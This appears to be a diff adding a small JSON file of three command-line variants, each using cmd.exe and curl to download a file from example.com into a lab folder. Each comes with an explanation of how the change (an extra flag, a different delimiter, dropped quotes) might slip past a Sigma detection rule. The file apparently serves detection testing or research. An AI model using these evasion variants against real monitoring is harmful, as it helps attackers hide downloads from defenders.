@@ -1,0 +1,14 @@
+[
+  {
+    "output": "cmd.exe /c \"curl -k http://example.com -o C:\\Lab\\out\\archive.7z & dir\"",
+    "explanation": "Insertion: Added the -k flag and replaced C:\\Temp\\test.txt with a lab placeholder C:\\Lab\\out\\archive.7z. The Sigma rule may miss this if it checks for specific paths or doesn't account for additional flags."
+  },
+  {
+    "output": "cmd.exe /c curl http://example.com -o C:\\Lab\\out\\archive.7z && dir",
+    "explanation": "Substitution: Replaced the ' & ' delimiter with ' && ' which is functionally equivalent. The Sigma rule may not detect this if it's looking for a specific delimiter."
+  },
+  {
+    "output": "cmd.exe /c curl http://example.com -o C:\\Lab\\out\\archive.7z & dir",
+    "explanation": "Omission: Removed the quotes around the command line. The Sigma rule may not detect this if it's looking for specific quoting patterns."
+  }
+]
